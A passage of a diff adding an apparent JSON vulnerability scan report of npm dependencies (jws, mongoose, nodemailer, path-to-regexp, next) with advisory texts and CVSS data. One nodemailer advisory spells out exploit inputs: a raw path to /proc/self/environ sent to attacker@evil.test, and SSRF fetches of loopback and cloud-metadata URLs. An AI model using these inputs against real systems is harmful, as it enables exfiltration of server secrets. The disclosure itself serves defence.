+            "https://bugzilla.redhat.com/show_bug.cgi?id=2488480",
+            "https://cwe.mitre.org/data/definitions/93.html",
+            "https://github.com/form-data/form-data",
+            "https://github.com/form-data/form-data/commit/64190db548c0179e37206858e39f27cf513e9435",
+            "https://github.com/form-data/form-data/commit/be3f3cf553978bac15a5182f1f3c3d2d38ccf229",
+            "https://github.com/form-data/form-data/commit/c7133499c2ee1b80c678e411244f4442bf902045",
+            "https://github.com/form-data/form-data/security/advisories/GHSA-hmw2-7cc7-3qxx",
+            "https://html.spec.whatwg.org/multipage/form-control-infrastructure.html#multipart-form-data",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-12143",
+            "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-12143.json",
+            "https://www.cve.org/CVERecord?id=CVE-2026-12143",
+            "https://www.npmjs.com/package/form-data"
+          ],
+          "PublishedDate": "2026-06-12T19:16:26.56Z",
+          "LastModifiedDate": "2026-07-02T12:16:54.863Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2025-65945",
+          "PkgID": "jws@3.2.2",
+          "PkgName": "jws",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/jws@3.2.2",
+            "UID": "ff78ee3c4e66a487"
+          },
+          "InstalledVersion": "3.2.2",
+          "FixedVersion": "3.2.3, 4.0.1",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2025-65945",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "node-jws: auth0/node-jws: Improper signature verification in HS256 algorithm",
+          "Description": "auth0/node-jws is a JSON Web Signature implementation for Node.js. In versions 3.2.2 and earlier and version 4.0.0, auth0/node-jws has an improper signature verification vulnerability when using the HS256 algorithm under specific conditions. Applications are affected when they use the jws.createVerify() function for HMAC algorithms and use user-provided data from the JSON Web Signature protected header or payload in HMAC secret lookup routines, which can allow attackers to bypass signature verification. This issue has been patched in versions 3.2.3 and 4.0.1.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-347"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2025-65945",
+            "https://github.com/auth0/node-jws",
+            "https://github.com/auth0/node-jws/commit/34c45b2c04434f925b638de6a061de9339c0ea2e",
+            "https://github.com/auth0/node-jws/commit/4f6e73f24df42f07d632dec6431ade8eda8d11a6",
+            "https://github.com/auth0/node-jws/releases/tag/v3.2.3",
+            "https://github.com/auth0/node-jws/releases/tag/v4.0.1",
+            "https://github.com/auth0/node-jws/security/advisories/GHSA-869p-cjfg-cm3x",
+            "https://nvd.nist.gov/vuln/detail/CVE-2025-65945",
+            "https://www.cve.org/CVERecord?id=CVE-2025-65945"
+          ],
+          "PublishedDate": "2025-12-04T19:16:05.55Z",
+          "LastModifiedDate": "2026-06-17T09:56:06.31Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-42334",
+          "PkgID": "mongoose@8.16.0",
+          "PkgName": "mongoose",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/mongoose@8.16.0",
+            "UID": "3d7de3d2a091887b"
+          },
+          "InstalledVersion": "8.16.0",
+          "FixedVersion": "6.13.9, 7.8.9, 8.22.1, 9.1.6",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-42334",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "Mongoose's Improper Sanitization of $nor in sanitizeFilter May Allow NoSQL Injection",
+          "Description": "Mongoose is a MongoDB object modeling tool designed to work in an asynchronous environment. Prior to 6.13.9, 7.8.9, 8.22.1, and 9.1.6, a vulnerability allows bypassing Mongoose’s sanitizeFilter query sanitization mechanism via the $nor operator. When sanitizeFilter is enabled, Mongoose wraps query operators in $eq to neutralize them. However, prior to the fix, $nor was not included in the set of logical operators that are recursively sanitized. Because $nor accepts an array (like $and and $or), and arrays do not trigger hasDollarKeys(), malicious operators such as $ne, $gt, or $regex could be injected inside a $nor clause without being sanitized. This vulnerability is fixed in 6.13.9, 7.8.9, 8.22.1, and 9.1.6.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-74"
+          ],
+          "VendorSeverity": {
+            "bitnami": 3,
+            "ghsa": 3
+          },
+          "CVSS": {
+            "bitnami": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+              "V3Score": 7.5
+            },
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://github.com/Automattic/mongoose",
+            "https://github.com/Automattic/mongoose/security/advisories/GHSA-wpg9-53fq-2r8h",
+            "https://mongoosejs.com/docs/api/mongoose.html#Mongoose.prototype.sanitizeFilter()",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-42334",
+            "https://thecodebarbarian.com/whats-new-in-mongoose-6-sanitizefilter.html"
+          ],
+          "PublishedDate": "2026-05-14T18:16:47.747Z",
+          "LastModifiedDate": "2026-06-17T10:47:42.1Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2025-14874",
+          "PkgID": "nodemailer@7.0.3",
+          "PkgName": "nodemailer",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/nodemailer@7.0.3",
+            "UID": "c07b794a29d20bcd"
+          },
+          "InstalledVersion": "7.0.3",
+          "FixedVersion": "7.0.11",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2025-14874",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "nodemailer: Nodemailer: Denial of service via crafted email address header",
+          "Description": "A flaw was found in Nodemailer. This vulnerability allows a denial of service (DoS) via a crafted email address header that triggers infinite recursion in the address parser.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-703"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "nvd": 3,
+            "redhat": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2025-14874",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2418133",
+            "https://github.com/nodemailer/nodemailer",
+            "https://github.com/nodemailer/nodemailer/commit/b61b9c0cfd682b6f647754ca338373b68336a150",
+            "https://github.com/nodemailer/nodemailer/security/advisories/GHSA-rcmh-qjqh-p98v",
+            "https://nvd.nist.gov/vuln/detail/CVE-2025-14874",
+            "https://www.cve.org/CVERecord?id=CVE-2025-14874"
+          ],
+          "PublishedDate": "2025-12-18T09:15:44.87Z",
+          "LastModifiedDate": "2026-06-17T08:36:41.44Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-p6gq-j5cr-w38f",
+          "PkgID": "nodemailer@7.0.3",
+          "PkgName": "nodemailer",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/nodemailer@7.0.3",
+            "UID": "c07b794a29d20bcd"
+          },
+          "InstalledVersion": "7.0.3",
+          "FixedVersion": "9.0.1",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-p6gq-j5cr-w38f",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "Nodemailer: Message-level raw option bypasses disableFileAccess/disableUrlAccess, enabling arbitrary file read and full-response SSRF in the delivered message",
+          "Description": "# Message-level `raw` option bypasses `disableFileAccess` / `disableUrlAccess`, enabling arbitrary file read and full-response SSRF in the sent message\n\n- **Target:** nodemailer/nodemailer, npm `nodemailer` **v9.0.0** (HEAD `4e58450eb490e5097a74b2b2cce35a8d9e21856e`)\n- **Verdict:** CONFIRMED (local PoC, no network)\n\n## Summary\n\nNodemailer exposes `disableFileAccess` and `disableUrlAccess` so an application that passes\n**untrusted** message data to the library can forbid that data from reading local files or\nfetching URLs. Every attachment, alternative, `html`/`text`/`watchHtml`/`amp` and `icalEvent`\ncontent node honors these flags. **The message-level `raw` option does not.**\n\n`MailComposer.compile()` builds the root MIME node for a `raw` message **without** threading the\ntwo flags, so a `raw: { path: '/etc/passwd' }` or `raw: { href: 'http://169.254.169.254/…' }`\nmessage is read / fetched anyway, and the file or HTTP-response bytes become the **actual\nmessage that is sent** by every transport (SMTP, SES, sendmail, stream, JSON). An actor whose\ninput the application intended to sandbox therefore obtains arbitrary local-file disclosure and\na full-response SSRF primitive, delivered to a recipient the same actor can choose.\n\nThis is the same vulnerability class as the already-published jsonTransport advisory\n**GHSA-wqvq-jvpq-h66f**, but a **distinct code path** (`raw` root node, not `normalize()`), and\nstrictly higher impact: the jsonTransport bug only affected the locally-returned JSON, whereas\nthis affects the delivered RFC822 message for all transports.\n\n## Affected component\n\n- `lib/mail-composer/index.js:34-35` — root cause:\n  ```js\n  if (this.mail.raw) {\n      this.message = new MimeNode('message/rfc822', { newline: this.mail.newline }).setRaw(this.mail.raw);\n  }\n  ```\n  The `MimeNode` is constructed with only `{ newline }`. Compare the sibling node builders\n  `_createMixed`/`_createAlternative`/`_createRelated`/`_createContentNode`\n  (`lib/mail-composer/index.js:389-527`), which all pass\n  `disableUrlAccess: this.mail.disableUrlAccess, disableFileAccess: this.mail.disableFileAccess`.\n- `lib/mime-node/index.js:51-52` — the constructor derives `this.disableFileAccess`/\n  `this.disableUrlAccess` solely from its own `options`; children do **not** inherit a parent's\n  flags (`createChild`/`appendChild`, lines 175-194, pass options through verbatim).\n- `lib/mime-node/index.js:812` — `setRaw()` content is resolved through `this._getStream(this._raw)`.\n- `lib/mime-node/index.js:984-1010` — `_getStream` reads the file (`fs.createReadStream`, 995) or\n  fetches the URL (`nmfetch`, 1009) **only guarded by `this.disableFileAccess`/`this.disableUrlAccess`**,\n  which on the `raw` root node are `false`.\n- Reached from the normal send flow at `lib/mailer/index.js:188`\n  (`mail.message = new MailComposer(mail.data).compile()`), so every transport is affected.\n\n## Reachability gate (hop-by-hop)\n\n1. **Source.** Application calls `transporter.sendMail({ raw: \u003cuserControlled\u003e , to: \u003cuserControlled\u003e })`\n   with `disableFileAccess: true` and/or `disableUrlAccess: true` configured on the transporter\n   (forced onto `mail.data` in `lib/mailer/mail-message.js:36-40`) or per message. This is the\n   exact scenario the flags exist for — the same precondition under which GHSA-wqvq-jvpq-h66f was\n   accepted.\n2. **Guard — the access flags.** For attachments the flag is enforced: a node created by\n   `_createContentNode` carries `disableFileAccess`, so `_getStream` throws `EFILEACCESS`.\n   **Bypass:** the `raw` branch (`compile():34-35`) never sets the flag on its node, so\n   `this.disableFileAccess === false` and the guard at `mime-node:985` / `:999` is skipped.\n   There is no other validation between `mail.raw` and the read; `raw` content shapes\n   (`{path}`, `{href}`, stream, string, buffer) are accepted as-is by `setRaw`/`_getStream`.\n3. **Sink.** `fs.createReadStream(content.path)` (file disclosure) or\n   `nmfetch(content.href, …)` (SSRF). The resulting bytes are emitted as the message body by\n   `createReadStream()`, which every transport pipes to its destination\n   (`smtp-transport:233`, `smtp-pool/pool-resource:208`, `ses-transport:96`, `sendmail-transport:184`,\n   `stream-transport:67`).\n\nNo guard blocks the chain; the only guard (the access flags) is structurally absent on this node.\n\n## Root cause\n\nInconsistent enforcement: the access policy is applied per-`MimeNode` via constructor options and\nmust be re-passed at every node creation. The `raw`-message shortcut in `compile()` omits it,\nwhile all five other node builders include it. The flags are therefore enforced for every content\ntype *except* the one that lets the caller supply a complete message body by path/URL.\n\n## Exploit path\n\nApplication that sandboxes untrusted mail input (`disableFileAccess`/`disableUrlAccess` set):\n\n1. Untrusted actor supplies `raw: { path: '/proc/self/environ' }` (or any server file:\n   `/app/.env`, key material, etc.) and `to: attacker@evil.test`.\n2. `compile()` builds the raw root node without the flags; the transport reads the file and sends\n   its contents as the message → **arbitrary server-file exfiltration to an attacker-chosen mailbox.**\n3. Alternatively `raw: { href: 'http://127.0.0.1:8080/admin' }` or a cloud metadata URL →\n   Nodemailer fetches it server-side and delivers the full response body in the email →\n   **full-response SSRF** (no blind-channel limitation).\n\n## Impact\n\n- **Confidentiality (High):** arbitrary local file read disclosed in the outgoing message;\n  full-response SSRF to internal/metadata endpoints, also disclosed in the message.\n- **Integrity (Low):** attacker-fetched/file content is injected into the delivered mail.\n- The two protective flags an application relies on to contain untrusted input are silently\n  ineffective for `raw`.\n\n## Preconditions\n\nThe application (a) passes `disableFileAccess` and/or `disableUrlAccess` (the documented sandboxing\nflags) and (b) lets untrusted input influence the `raw` field (and, for maximal disclosure, `to`).\nNo other configuration is required; all bundled transports are affected. This mirrors the accepted\nprecondition of GHSA-wqvq-jvpq-h66f.\n\n## Severity\n\n- **AV** — message data routinely originates over the network in the apps these flags protect.\n- **AC** — a single crafted `raw` object; deterministic.\n- **PR** — the actor is a user whose input the app already treats as untrusted (the reason the\n  flags are set); not fully anonymous in the typical deployment.\n- **UI** — no victim interaction.\n- **S** — impact within Nodemailer's process scope.\n- **C** — arbitrary file read **and** full-response SSRF, both delivered to an attacker-chosen\n  recipient. (The sibling jsonTransport advisory used C:L because its leak stayed in locally-returned\n  JSON; here the bytes leave the system in the sent message, so C:H is warranted.)\n- **I** — attacker injects fetched/file bytes into the outgoing message.\n- **A**.\nNote: if a deployment fixes the recipient (`to` not attacker-controlled) the disclosure channel\nnarrows and the rating degrades toward the sibling's Medium; the High rating reflects the\nreasonable worst case where `raw` and `to` are both untrusted.\n\n## Adversarial re-read (attempts to refute)\n\n1. **\"`raw` content is by-design trusted, so the flags shouldn't apply.\"** Rejected: every other\n   content path (attachments, alternatives, html/text, icalEvent) honors the flags, and the\n   maintainer already accepted GHSA-wqvq-jvpq-h66f for exactly this \"untrusted input + flag set\"\n   model. The asymmetry — attachment `{path}` is blocked but `raw:{path}` is not — is the bug, and\n   the PoC's CONTROL case proves the flag is otherwise effective on the same file.\n2. **\"The raw node inherits the flags via rootNode.\"** Rejected by code and by PoC: `compile():35`\n   constructs the node with `{ newline }` only; `MimeNode` constructor sets\n   `this.disableFileAccess = !!options.disableFileAccess` → `false`; `rootNode` is itself; no\n   inheritance exists.\n3. **\"The PoC leaks for an unrelated reason.\"** Rejected: the CONTROL message (`attachments:[{path}]`,\n   same file, same transporter) returns `EFILEACCESS`; only the `raw:{path}` message leaks. The\n   sentinel nonce exists solely in the temp file; the URL nonce is generated server-side and is only\n   obtainable by an actual fetch. Both observables are uniquely bound to the bypass.\n4. **\"Maybe only jsonTransport (already reported) is affected.\"** Rejected: the PoC uses\n   `streamTransport` and the root cause is in `MailComposer.compile()` (`mailer:188`), shared by all\n   transports; jsonTransport is a different (already-fixed) path.\n\nI could not find any guard that blocks the chain; the finding survives.\n\n## Proof of concept (safe, benign)\n\n`findings/nodemailer/raw/poc-raw-fileaccess-bypass.js` — local, no network egress (loopback only),\nno destructive action. Output:\n```\n[CONTROL] attachment path with disableFileAccess: BLOCKED (EFILEACCESS) — flag works here\n[ATTACK]  raw:{path} with disableFileAccess=true: BYPASSED — sentinel file CONTENT present in message\n[ATTACK]  raw:{href} with disableUrlAccess=true (loopback server): BYPASSED — fetched body present (SSRF)\nVERDICT: CONFIRMED\n```\nRun: `node findings/nodemailer/raw/poc-raw-fileaccess-bypass.js` (exit 0 = confirmed).\n\n## Remediation\n\nThread the access policy onto the `raw` root node, exactly as the other builders do:\n```js\nif (this.mail.raw) {\n    this.message = new MimeNode('message/rfc822', {\n        newline: this.mail.newline,\n        disableFileAccess: this.mail.disableFileAccess,\n        disableUrlAccess: this.mail.disableUrlAccess\n    }).setRaw(this.mail.raw);\n}\n```\n(Defense in depth: `setRaw`/`_getStream` could also refuse `{path}`/`{href}` raw content when either\nflag is set, regardless of how the node was constructed.) Add a regression test asserting that\n`raw:{path}` and `raw:{href}` reject with `EFILEACCESS`/`EURLACCESS` when the flags are set, mirroring\nthe attachment tests.",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N",
+              "V3Score": 7.1
+            }
+          },
+          "References": [
+            "https://github.com/nodemailer/nodemailer",
+            "https://github.com/nodemailer/nodemailer/security/advisories/GHSA-p6gq-j5cr-w38f"
+          ],
+          "PublishedDate": "2026-06-18T14:28:05Z",
+          "LastModifiedDate": "2026-06-18T14:28:05Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-4867",
+          "PkgID": "path-to-regexp@0.1.12",
+          "PkgName": "path-to-regexp",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/path-to-regexp@0.1.12",
+            "UID": "e14ccb0d1fae2c4e"
+          },
+          "InstalledVersion": "0.1.12",
+          "FixedVersion": "0.1.13",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-4867",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "path-to-regexp: path-to-regexp: Denial of Service via catastrophic backtracking from malformed URL parameters",
+          "Description": "Impact:\n\nA bad regular expression is generated any time you have three or more parameters within a single segment, separated by something that is not a period (.). For example, /:a-:b-:c or /:a-:b-:c-:d. The backtrack protection added in path-to-regexp@0.1.12 only prevents ambiguity for two parameters. With three or more, the generated lookahead does not block single separator characters, so capture groups overlap and cause catastrophic backtracking.\n\nPatches:\n\nUpgrade to path-to-regexp@0.1.13\n\nCustom regex patterns in route definitions (e.g., /:a-:b([^-/]+)-:c([^-/]+)) are not affected because they override the default capture group.\n\nWorkarounds:\n\nAll versions can be patched by providing a custom regular expression for parameters after the first in a single segment. As long as the custom regular expression does not match the text before the parameter, you will be safe. For example, change /:a-:b-:c to /:a-:b([^-/]+)-:c([^-/]+).\n\nIf paths cannot be rewritten and versions cannot be upgraded, another alternative is to limit the URL length.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-1333"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+              "V3Score": 5.3
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-4867",
+            "https://blakeembrey.com/posts/2024-09-web-redos",
+            "https://cna.openjsf.org/security-advisories.html",
+            "https://github.com/advisories/GHSA-9wv6-86v2-598j",
+            "https://github.com/pillarjs/path-to-regexp",
+            "https://github.com/pillarjs/path-to-regexp/releases/tag/v.0.1.13",
+            "https://github.com/pillarjs/path-to-regexp/security/advisories/GHSA-37ch-88jc-xwx2",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-4867",
+            "https://www.cve.org/CVERecord?id=CVE-2026-4867"
+          ],
+          "PublishedDate": "2026-03-26T17:16:42.983Z",
+          "LastModifiedDate": "2026-06-17T10:57:21.827Z"
+        }
+      ]
+    },
+    {
+      "Target": "frontend/package-lock.json",
+      "Class": "lang-pkgs",
+      "Type": "npm",
+      "Vulnerabilities": [
+        {
+          "VulnerabilityID": "CVE-2025-55182",
+          "PkgID": "next@15.3.3",
+          "PkgName": "next",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/next@15.3.3",
+            "UID": "53ceb7947fa1155d"
+          },
+          "InstalledVersion": "15.3.3",
+          "FixedVersion": "15.0.5, 15.1.9, 15.2.6, 15.3.6, 15.4.8, 15.5.7, 16.0.7",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2025-55182",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "next: React Server Components: Pre-authentication remote code execution via unsafe deserialization",
+          "Description": "A pre-authentication remote code execution vulnerability exists in React Server Components versions 19.0.0, 19.1.0, 19.1.1, and 19.2.0 including the following packages: react-server-dom-parcel, react-server-dom-turbopack, and react-server-dom-webpack. The vulnerable code unsafely deserializes payloads from HTTP requests to Server Function endpoints.",
+          "Severity": "CRITICAL",
+          "CweIDs": [
+            "CWE-502"
+          ],
+          "VendorSeverity": {
+            "ghsa": 4,
+            "redhat": 4
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+              "V3Score": 10
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+              "V3Score": 10
+            }
+          },
+          "References": [
+            "http://www.openwall.com/lists/oss-security/2025/12/03/4",
+            "https://access.redhat.com/security/cve/CVE-2025-55182",
+            "https://aws.amazon.com/blogs/security/china-nexus-cyber-threat-groups-rapidly-exploit-react2shell-vulnerability-cve-2025-55182/",
+            "https://github.com/ejpir/CVE-2025-55182-poc",
+            "https://github.com/facebook/react",
+            "https://github.com/facebook/react/commit/7dc903cd29dac55efb4424853fd0442fef3a8700",
+            "https://github.com/facebook/react/pull/35277",
+            "https://github.com/facebook/react/releases/tag/v19.0.1",
+            "https://github.com/facebook/react/releases/tag/v19.1.2",
+            "https://github.com/facebook/react/releases/tag/v19.2.1",
+            "https://github.com/facebook/react/security/advisories/GHSA-fv66-9v8q-g76r",
+            "https://news.ycombinator.com/item?id=46136026",
+            "https://nextjs.org/blog/CVE-2025-66478",
+            "https://nvd.nist.gov/vuln/detail/CVE-2025-55182",
+            "https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components",
+            "https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
+            "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2025-55182",
+            "https://www.cve.org/CVERecord?id=CVE-2025-55182",
+            "https://www.facebook.com/security/advisories/cve-2025-55182"
+          ],
+          "PublishedDate": "2025-12-03T16:15:56.463Z",
+          "LastModifiedDate": "2026-06-17T09:41:24.913Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-44573",
+          "PkgID": "next@15.3.3",
+          "PkgName": "next",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/next@15.3.3",
+            "UID": "53ceb7947fa1155d"
+          },
+          "InstalledVersion": "15.3.3",
+          "FixedVersion": "15.5.16, 16.2.5",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-44573",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "next.js: Next.js: Information disclosure due to middleware bypass in Pages Router with i18n",
+          "Description": "Next.js is a React framework for building full-stack web applications. From 12.2.0 to before 15.5.16 and 16.2.5, Applications using the Pages Router with i18n configured and middleware/proxy-based authorization can allow unauthorized access to protected page data through locale-less /_next/data/\u003cbuildId\u003e/\u003cpage\u003e.json requests. In affected configurations, middleware does not run for the unprefixed data route, allowing an attacker to retrieve SSR JSON for protected pages without passing the intended authorization checks. This vulnerability is fixed in 15.5.16 and 16.2.5.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-863",
+            "CWE-551"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-44573",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2477199",
+            "https://github.com/vercel/next.js",
+            "https://github.com/vercel/next.js/releases/tag/v15.5.16",
+            "https://github.com/vercel/next.js/releases/tag/v16.2.5",
+            "https://github.com/vercel/next.js/security/advisories/GHSA-36qx-fr4f-26g5",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-44573",
+            "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-44573.json",
+            "https://www.cve.org/CVERecord?id=CVE-2026-44573"
+          ],
+          "PublishedDate": "2026-05-13T17:16:22.627Z",
+          "LastModifiedDate": "2026-06-30T03:19:59.473Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-44575",
+          "PkgID": "next@15.3.3",
+          "PkgName": "next",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/next@15.3.3",
+            "UID": "53ceb7947fa1155d"
+          },
+          "InstalledVersion": "15.3.3",
+          "FixedVersion": "15.5.16, 16.2.5",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-44575",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "next.js: Next.js: Unauthorized access to protected content via middleware bypass",
+          "Description": "Next.js is a React framework for building full-stack web applications. From 15.2.0 to before 15.5.16 and 16.2.5, App Router applications that rely on middleware or proxy-based checks for authorization can allow unauthorized access through transport-specific route variants used for segment prefetching. In affected configurations, specially crafted .rsc and segment-prefetch URLs can resolve to the same page without being matched by the intended middleware rule, which can allow protected content to be reached without the expected authorization check. This vulnerability is fixed in 15.5.16 and 16.2.5.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-288",
+            "CWE-551"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-44575",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2477188",
+            "https://github.com/vercel/next.js",
+            "https://github.com/vercel/next.js/releases/tag/v15.5.16",
+            "https://github.com/vercel/next.js/releases/tag/v16.2.5",
+            "https://github.com/vercel/next.js/security/advisories/GHSA-267c-6grr-h53f",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-44575",
+            "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-44575.json",
+            "https://www.cve.org/CVERecord?id=CVE-2026-44575"
+          ],
+          "PublishedDate": "2026-05-13T17:16:22.907Z",
+          "LastModifiedDate": "2026-06-30T03:19:59.88Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-44578",
+          "PkgID": "next@15.3.3",
+          "PkgName": "next",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/next@15.3.3",
+            "UID": "53ceb7947fa1155d"
+          },
+          "InstalledVersion": "15.3.3",
+          "FixedVersion": "15.5.16, 16.2.5",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-44578",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "Next.js: Next.js: Server-Side Request Forgery via crafted WebSocket upgrade requests",
+          "Description": "Next.js is a React framework for building full-stack web applications. From 13.4.13 to before 15.5.16 and 16.2.5, self-hosted applications using the built-in Node.js server can be vulnerable to server-side request forgery through crafted WebSocket upgrade requests. An attacker can cause the server to proxy requests to arbitrary internal or external destinations, which may expose internal services or cloud metadata endpoints. Vercel-hosted deployments are not affected. This vulnerability is fixed in 15.5.16 and 16.2.5.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-918"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
